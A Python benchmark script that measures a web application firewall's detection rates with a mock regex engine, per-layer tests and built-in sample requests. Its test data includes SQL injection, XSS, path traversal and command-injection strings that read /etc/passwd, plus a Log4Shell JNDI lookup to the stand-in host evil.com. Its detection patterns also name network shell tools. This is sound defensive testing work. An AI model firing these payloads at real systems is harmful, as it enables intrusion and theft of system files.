#!/usr/bin/env python3
"""
benchmark.py
------------
Complete WAF evaluation benchmark.

Loads legit + malicious datasets, sends every request through the
DetectionEngine, and computes:
  TP, FP, TN, FN, Precision, Recall, FPR, F1

Also supports:
  --layer  signature | rate | anomaly | all   (test individual layers)
  --verbose                                   (print every request result)
  --input  path to JSON dataset               (use custom dataset)

Usage:
  python benchmark.py
  python benchmark.py --verbose
  python benchmark.py --layer signature
  python benchmark.py --input datasets/processed/sqli.json --verbose
"""

import sys
import json
import time
import argparse
import textwrap
from pathlib import Path
from dataclasses import dataclass, field
from typing import Optional

# ---------------------------------------------------------------------------
# Path setup — works whether run from repo root or tests/
# ---------------------------------------------------------------------------
REPO_ROOT = Path(__file__).parent.parent.resolve()
sys.path.insert(0, str(REPO_ROOT))

# Try to import the real DetectionEngine.
# Falls back to a mock engine if the actual project isn't installed.
try:
    from src.engine.detector import DetectionEngine
    from src.config import DetectionConfig, RateLimitConfig, AnomalyConfig
    ENGINE_AVAILABLE = True
    print("[INFO] Using real DetectionEngine from src/")
except ImportError:
    ENGINE_AVAILABLE = False
    print("[WARN] src.engine.detector not found — using MOCK engine for demo\n")


# ============================================================
# MOCK ENGINE (used when the real engine isn't in the path)
# This simulates realistic detection so the benchmark logic
# is fully exercisable without the real codebase.
# ============================================================
import re as _re

class _MockResult:
    def __init__(self, decision, reason, threat_level="SAFE"):
        self.recommendation = decision       # "BLOCK" | "FLAG" | "ALLOW"
        self.reason = reason
        self.threat_level = threat_level
        self.is_threat = decision in ("BLOCK", "FLAG")

class MockDetectionEngine:
    """Simplified detection engine that mirrors real engine decisions."""

    _SQLI  = _re.compile(r"(UNION\s+SELECT|'\s*(OR|AND)\s*'|DROP\s+TABLE|SLEEP\s*\(|INSERT\s+INTO|DELETE\s+FROM|EXEC(UTE)?|BENCHMARK\()", _re.I)
    _XSS   = _re.compile(r"(<script|javascript:|on\w+=|<iframe|<img[^>]*onerror)", _re.I)
    _PATH  = _re.compile(r"(\.\./|\.\.\\|%2e%2e%2f|%252e)", _re.I)
    _CMDI  = _re.compile(r"(;\s*(cat|ls|rm|wget|curl|bash|sh|nc)\b|\|\s*(bash|sh|nc)\b|`[^`]+`|\$\()", _re.I)
    _LOG4  = _re.compile(r"\$\{jndi:", _re.I)

    _request_counts: dict = {}

    def analyze(self, method, url, headers, body, ip_address):
        target = f"{url} {body}"
        headers_str = " ".join(f"{k}: {v}" for k, v in (headers or {}).items())
        full_text = f"{target} {headers_str}"

        # Layer 1: Signatures
        if self._LOG4.search(full_text):
            return _MockResult("BLOCK", "Log4Shell detected", "CRITICAL")
        if self._SQLI.search(full_text):
            return _MockResult("BLOCK", "SQL Injection pattern matched", "HIGH")
        if self._XSS.search(full_text):
            return _MockResult("BLOCK", "XSS pattern matched", "HIGH")
        if self._PATH.search(full_text):
            return _MockResult("BLOCK", "Path Traversal pattern matched", "HIGH")
        if self._CMDI.search(full_text):
            return _MockResult("BLOCK", "Command Injection pattern matched", "CRITICAL")

        # Layer 2: Rate limiting
        now = time.time()
        key = ip_address or "unknown"
        timestamps = self._request_counts.get(key, [])
        timestamps = [t for t in timestamps if now - t < 60]
        timestamps.append(now)
        self._request_counts[key] = timestamps
        if len(timestamps) > 20:
            return _MockResult("BLOCK", "Rate limit exceeded", "MEDIUM")

        # Layer 3: Anomaly
        url_len = len(url or "")
        body_len = len(body or "")
        special = sum(1 for c in full_text if c in "!@#$%^&*()_+[]{}|;':\",./<>?`~\\")
        if url_len > 300 or body_len > 5000 or special > 40:
            return _MockResult("FLAG", "Statistical anomaly detected", "LOW")

        return _MockResult("ALLOW", "No threats detected", "SAFE")


# ---------------------------------------------------------------------------
# Colour helpers (graceful fallback if colorama not installed)
# ---------------------------------------------------------------------------
try:
    from colorama import init as _cinit, Fore, Style
    _cinit(autoreset=True)
    RED     = Fore.RED
    GREEN   = Fore.GREEN
    YELLOW  = Fore.YELLOW
    CYAN    = Fore.CYAN
    MAGENTA = Fore.MAGENTA
    RESET   = Style.RESET_ALL
    BOLD    = Style.BRIGHT
except ImportError:
    RED = GREEN = YELLOW = CYAN = MAGENTA = RESET = BOLD = ""


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class BenchmarkResult:
    tp: int = 0   # attack → BLOCK or FLAG  ✓
    tn: int = 0   # legit  → ALLOW          ✓
    fp: int = 0   # legit  → BLOCK or FLAG  ✗ (false alarm)
    fn: int = 0   # attack → ALLOW          ✗ (missed attack)

    per_attack_type: dict = field(default_factory=dict)  # attack_type → {tp, fn}

    @property
    def total(self) -> int:
        return self.tp + self.tn + self.fp + self.fn

    @property
    def precision(self) -> float:
        denom = self.tp + self.fp
        return self.tp / denom if denom else 0.0

    @property
    def recall(self) -> float:
        denom = self.tp + self.fn
        return self.tp / denom if denom else 0.0

    @property
    def fpr(self) -> float:
        """False Positive Rate = FP / (FP + TN)"""
        denom = self.fp + self.tn
        return self.fp / denom if denom else 0.0

    @property
    def f1(self) -> float:
        p, r = self.precision, self.recall
        denom = p + r
        return 2 * p * r / denom if denom else 0.0

    @property
    def accuracy(self) -> float:
        return (self.tp + self.tn) / self.total if self.total else 0.0


# ---------------------------------------------------------------------------
# Dataset loading
# ---------------------------------------------------------------------------

def _load(path: Path) -> list[dict]:
    if not path.exists():
        return []
    data = json.loads(path.read_text())
    return data if isinstance(data, list) else []


def load_datasets(dataset_dir: Path) -> tuple[list[dict], list[dict]]:
    """Return (legit_records, malicious_records)."""
    processed = dataset_dir / "processed"

    legit     = _load(processed / "legit.json")
    malicious = _load(processed / "malicious.json")

    # Also try owasp.json and fuzzdb.json if they exist
    for extra in ("owasp.json", "fuzzdb.json", "sqli.json", "xss.json",
                  "cmdi.json", "log4shell.json"):
        extra_path = processed / extra
        if extra_path.exists():
            records = _load(extra_path)
            attacks = [r for r in records if r.get("label") == "attack"]
            legits  = [r for r in records if r.get("label") == "legit"]
            malicious.extend(attacks)
            legit.extend(legits)

    return legit, malicious


# ---------------------------------------------------------------------------
# Core benchmark runner
# ---------------------------------------------------------------------------

def run_benchmark(
        engine,
        records: list[dict],
        verbose: bool = False,
) -> tuple[BenchmarkResult, list[dict]]:
    """
    Run all records through the engine.
    Returns (BenchmarkResult, list_of_detailed_logs).
    """
    result = BenchmarkResult()
    logs   = []

    for i, record in enumerate(records):
        method  = record.get("method",  "GET")
        url     = record.get("url",     "/")
        headers = record.get("headers", {})
        body    = record.get("body",    "")
        ip      = record.get("ip",      "127.0.0.1")
        label   = record.get("label",   "unknown")
        attack_type = record.get("attack_type", "Unknown")

        try:
            t0 = time.perf_counter()
            detection = engine.analyze(method, url, headers, body, ip)
            elapsed_ms = (time.perf_counter() - t0) * 1000
        except Exception as e:
            print(f"  [ERROR] record {i}: {e}")
            continue

        decision = getattr(detection, "recommendation", "ALLOW")
        reason   = getattr(detection, "reason",         "")

        # Classify: BLOCK or FLAG = engine detected a threat
        engine_flagged = decision in ("BLOCK", "FLAG")

        is_attack = (label == "attack")
        is_legit  = (label == "legit")

        if is_attack and engine_flagged:
            result.tp += 1
            outcome_tag = f"{GREEN}TP ✓{RESET}"
        elif is_legit and not engine_flagged:
            result.tn += 1
            outcome_tag = f"{GREEN}TN ✓{RESET}"
        elif is_legit and engine_flagged:
            result.fp += 1
            outcome_tag = f"{RED}FP ✗ (false alarm){RESET}"
        elif is_attack and not engine_flagged:
            result.fn += 1
            outcome_tag = f"{RED}FN ✗ (missed){RESET}"
        else:
            outcome_tag = f"{YELLOW}?{RESET}"   # unknown label

        # Per-attack-type tracking
        if is_attack:
            bucket = result.per_attack_type.setdefault(attack_type, {"tp": 0, "fn": 0})
            if engine_flagged:
                bucket["tp"] += 1
            else:
                bucket["fn"] += 1

        log_entry = {
            "index":      i + 1,
            "label":      label,
            "attack_type": attack_type,
            "method":     method,
            "url":        url[:80],
            "decision":   decision,
            "outcome":    outcome_tag,
            "reason":     reason,
            "elapsed_ms": round(elapsed_ms, 3),
        }
        logs.append(log_entry)

        if verbose:
            print(
                f"  [{i+1:04d}] {CYAN}{method:6}{RESET} "
                f"{url[:50]:52} "
                f"→ {BOLD}{decision:5}{RESET} "
                f"{outcome_tag}  ({elapsed_ms:.2f}ms)"
            )
            if reason:
                print(f"         Reason: {reason}")

    return result, logs


# ---------------------------------------------------------------------------
# Report printer
# ---------------------------------------------------------------------------

def print_summary(result: BenchmarkResult, elapsed_total: float, layer: str):
    bar = "=" * 65
    print(f"\n{BOLD}{bar}")
    print(f"  BENCHMARK SUMMARY  —  Layer: {layer.upper()}")
    print(f"{bar}{RESET}")

    print(f"\n  {'Metric':<30} {'Value':>10}")
    print(f"  {'-'*40}")
    print(f"  {'Total requests':<30} {result.total:>10}")
    print(f"  {'True Positives  (TP)':<30} {result.tp:>10}  {GREEN}(attacks detected){RESET}")
    print(f"  {'True Negatives  (TN)':<30} {result.tn:>10}  {GREEN}(legit allowed){RESET}")
    print(f"  {'False Positives (FP)':<30} {result.fp:>10}  {RED}(legit blocked — BAD){RESET}")
    print(f"  {'False Negatives (FN)':<30} {result.fn:>10}  {RED}(attacks missed — BAD){RESET}")

    print(f"\n  {'--- Performance ---'}")
    print(f"  {'Precision':<30} {result.precision:>9.1%}")
    print(f"  {'Recall':<30} {result.recall:>9.1%}")
    print(f"  {'False Positive Rate (FPR)':<30} {result.fpr:>9.1%}")
    print(f"  {'F1 Score':<30} {result.f1:>9.1%}")
    print(f"  {'Accuracy':<30} {result.accuracy:>9.1%}")
    print(f"  {'Total time':<30} {elapsed_total:>9.2f}s")
    if result.total:
        print(f"  {'Avg per request':<30} {elapsed_total/result.total*1000:>7.2f}ms")

    # Per-attack-type breakdown
    if result.per_attack_type:
        print(f"\n  {'--- Detection by Attack Type ---'}")
        print(f"  {'Attack Type':<25} {'Detected':>8} {'Missed':>8} {'Recall':>8}")
        print(f"  {'-'*53}")
        for atype, counts in sorted(result.per_attack_type.items()):
            tp_ = counts["tp"]
            fn_ = counts["fn"]
            total_ = tp_ + fn_
            recall_ = tp_ / total_ if total_ else 0.0
            color = GREEN if recall_ >= 0.9 else (YELLOW if recall_ >= 0.7 else RED)
            print(f"  {atype:<25} {tp_:>8} {fn_:>8} {color}{recall_:>7.1%}{RESET}")

    # Verdict
    print(f"\n  {'--- Verdict ---'}")
    if result.fpr <= 0.10 and result.recall >= 0.90:
        verdict = f"{GREEN}EXCELLENT — Production ready{RESET}"
    elif result.fpr <= 0.20 and result.recall >= 0.80:
        verdict = f"{YELLOW}GOOD — Tune anomaly thresholds{RESET}"
    elif result.recall < 0.60:
        verdict = f"{RED}POOR — Too many missed attacks (FN high){RESET}"
    else:
        verdict = f"{RED}NEEDS WORK — FPR too high (too many false alarms){RESET}"
    print(f"  {verdict}")
    print(f"\n{BOLD}{bar}{RESET}\n")


def save_report(result: BenchmarkResult, logs: list[dict], out_path: Path):
    """Save detailed results to JSON for post-analysis."""
    report = {
        "summary": {
            "tp": result.tp, "tn": result.tn,
            "fp": result.fp, "fn": result.fn,
            "precision":  round(result.precision, 4),
            "recall":     round(result.recall, 4),
            "fpr":        round(result.fpr, 4),
            "f1":         round(result.f1, 4),
            "accuracy":   round(result.accuracy, 4),
        },
        "per_attack_type": result.per_attack_type,
        "logs": logs,
    }
    out_path.write_text(json.dumps(report, indent=2, default=str))
    print(f"  Detailed report → {out_path}")


# ---------------------------------------------------------------------------
# Layer-specific test helpers
# ---------------------------------------------------------------------------

def run_signature_layer_test(engine, verbose: bool):
    """Test ONLY signature detection with known payloads."""
    print(f"\n{BOLD}=== Signature Layer Test ==={RESET}")
    KNOWN_ATTACKS = [
        ("GET", "/api?id=1 UNION SELECT * FROM users--",       "SQL Injection"),
        ("GET", "/api?q=<script>alert(1)</script>",            "XSS"),
        ("GET", "/api?file=../../etc/passwd",                  "Path Traversal"),
        ("GET", "/api?host=;cat /etc/passwd",                  "Command Injection"),
        ("GET", '/api?x=${jndi:ldap://evil.com/a}',            "Log4Shell"),
        ("POST","/api/login",                                  "SQL Injection"),
    ]
    KNOWN_LEGIT = [
        ("GET", "/api/users/1",                                "Legit"),
        ("GET", "/api/products?page=2&limit=10",               "Legit"),
        ("POST","/api/auth/login",                             "Legit"),
    ]

    for method, url, atype in KNOWN_ATTACKS:
        body = '{"username": "admin\' OR 1=1--"}' if method == "POST" and "SQL" in atype else ""
        r = engine.analyze(method, url, {}, body, "10.0.0.1")
        status = f"{GREEN}DETECTED{RESET}" if r.recommendation != "ALLOW" else f"{RED}MISSED{RESET}"
        print(f"  {atype:<22} → {r.recommendation:<5} {status}  | {url[:50]}")

    print()
    for method, url, label in KNOWN_LEGIT:
        r = engine.analyze(method, url, {}, "", "192.168.1.1")
        status = (f"{GREEN}OK (ALLOWED){RESET}" if r.recommendation == "ALLOW"
                  else f"{RED}FALSE POSITIVE{RESET}")
        print(f"  {label:<22} → {r.recommendation:<5} {status}  | {url[:50]}")


def run_rate_limit_test(engine, verbose: bool):
    """Test rate limiting by replaying same IP 30 times."""
    print(f"\n{BOLD}=== Rate Limit Layer Test ==={RESET}")
    ip = "99.99.99.99"
    blocked_at = None
    for i in range(1, 31):
        r = engine.analyze("GET", "/api/users", {}, "", ip)
        if r.recommendation == "BLOCK" and "rate" in r.reason.lower() and not blocked_at:
            blocked_at = i
        if verbose or i in (1, 5, 10, 15, 20, 25, 30):
            mark = (f"{RED}BLOCKED{RESET}" if r.recommendation == "BLOCK"
                    else f"{GREEN}ALLOWED{RESET}")
            print(f"  Request #{i:02d} → {r.recommendation:<5} {mark}")

    if blocked_at:
        print(f"\n  Rate limiter triggered at request #{blocked_at} ✓")
    else:
        print(f"\n  {RED}Rate limiter did NOT trigger in 30 requests — check threshold{RESET}")


def run_anomaly_layer_test(engine, verbose: bool):
    """Test anomaly detection with statistically weird requests."""
    print(f"\n{BOLD}=== Anomaly Detection Layer Test ==={RESET}")
    ANOMALIES = [
        ("GET",  "/api/users?" + "x=1&" * 30,                  "Too many params"),
        ("GET",  "/api/users?" + "a" * 500,                    "Very long URL"),
        ("POST", "/api/data",    "x" * 6000,                   "Huge body"),
        ("GET",  "/api/users",   "Normal request",              "Normal"),
    ]
    for row in ANOMALIES:
        if len(row) == 4:
            method, url, body, label = row
        else:
            method, url, label = row
            body = ""
        r = engine.analyze(method, url, {}, body, "192.168.5.5")
        expected_flag = label != "Normal"
        ok = (r.recommendation != "ALLOW") == expected_flag
        status = f"{GREEN}✓{RESET}" if ok else f"{RED}✗{RESET}"
        print(f"  {label:<22} → {r.recommendation:<5} {status}  | {r.reason}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(description="WAF Detection Engine Benchmark")
    ap.add_argument("--verbose", "-v",  action="store_true",
                    help="Print every request result")
    ap.add_argument("--layer",          default="all",
                    choices=["all", "signature", "rate", "anomaly"],
                    help="Test a specific layer only")
    ap.add_argument("--input",          default=None,
                    help="Custom JSON dataset path (overrides default datasets)")
    ap.add_argument("--limit",          type=int, default=None,
                    help="Max records to process per class")
    ap.add_argument("--report",         default="benchmark_report.json",
                    help="Output JSON report path")
    args = ap.parse_args()

    # --- Engine setup ---
    if ENGINE_AVAILABLE:
        try:
            engine = DetectionEngine()
        except Exception as e:
            print(f"[WARN] Could not init real engine ({e}), using mock")
            engine = MockDetectionEngine()
    else:
        engine = MockDetectionEngine()

    # --- Layer-specific tests ---
    if args.layer == "signature":
        run_signature_layer_test(engine, args.verbose)
        return
    if args.layer == "rate":
        run_rate_limit_test(engine, args.verbose)
        return
    if args.layer == "anomaly":
        run_anomaly_layer_test(engine, args.verbose)
        return

    # --- Full benchmark ---
    print(f"\n{BOLD}{'='*65}")
    print("  WAF DETECTION ENGINE — FULL BENCHMARK")
    print(f"{'='*65}{RESET}\n")

    # Load datasets
    DATASET_DIR = REPO_ROOT / "datasets"
    if args.input:
        custom = json.loads(Path(args.input).read_text())
        legit     = [r for r in custom if r.get("label") == "legit"]
        malicious = [r for r in custom if r.get("label") == "attack"]
    else:
        legit, malicious = load_datasets(DATASET_DIR)

    if not legit and not malicious:
        print(f"{YELLOW}[WARN] No datasets found in {DATASET_DIR}/processed/")
        print("  Run:  python scripts/collect_datasets.py  first{RESET}\n")
        print("Running with built-in minimal test set...\n")
        # Built-in minimal test set for a clean demo
        legit = [
            {"method":"GET","url":"/api/users/1","headers":{},"body":"","ip":"192.168.1.1","label":"legit"},
            {"method":"GET","url":"/api/products?page=1","headers":{},"body":"","ip":"192.168.1.2","label":"legit"},
            {"method":"POST","url":"/api/login","headers":{},"body":'{"email":"a@b.com","password":"pw123"}', "ip":"192.168.1.3","label":"legit"},
            {"method":"GET","url":"/api/orders","headers":{},"body":"","ip":"192.168.1.4","label":"legit"},
            {"method":"GET","url":"/api/search?q=laptop","headers":{},"body":"","ip":"192.168.1.5","label":"legit"},
        ]
        malicious = [
            {"method":"GET","url":"/api/users?id=1' OR '1'='1","headers":{},"body":"","ip":"10.0.0.1","label":"attack","attack_type":"SQL Injection"},
            {"method":"GET","url":"/api/search?q=<script>alert(1)</script>","headers":{},"body":"","ip":"10.0.0.2","label":"attack","attack_type":"XSS"},
            {"method":"GET","url":"/api/files?path=../../etc/passwd","headers":{},"body":"","ip":"10.0.0.3","label":"attack","attack_type":"Path Traversal"},
            {"method":"GET","url":"/api?x=${jndi:ldap://evil.com/a}","headers":{},"body":"","ip":"10.0.0.4","label":"attack","attack_type":"Log4Shell"},
            {"method":"GET","url":"/api/ping?host=;cat /etc/passwd","headers":{},"body":"","ip":"10.0.0.5","label":"attack","attack_type":"Command Injection"},
        ]

    if args.limit:
        legit     = legit[:args.limit]
        malicious = malicious[:args.limit]

    print(f"  Legit requests:    {len(legit)}")
    print(f"  Attack requests:   {len(malicious)}")
    print(f"  Total:             {len(legit) + len(malicious)}")
    print(f"  Verbose:           {args.verbose}\n")

    all_records = legit + malicious
    # Shuffle so legit/malicious are interleaved
    import random
    random.shuffle(all_records)

    print(f"Running {'verbose ' if args.verbose else ''}benchmark...")
    if args.verbose:
        print()

    t0 = time.perf_counter()
    result, logs = run_benchmark(engine, all_records, verbose=args.verbose)
    elapsed = time.perf_counter() - t0

    print_summary(result, elapsed, "ALL")

    report_path = REPO_ROOT / args.report
    save_report(result, logs, report_path)

    # Run layer-specific mini-tests after full benchmark
    print(f"\n{BOLD}Running individual layer checks...{RESET}")
    run_signature_layer_test(engine, False)
    run_rate_limit_test(engine, False)
    run_anomaly_layer_test(engine, False)


if __name__ == "__main__":
    main()
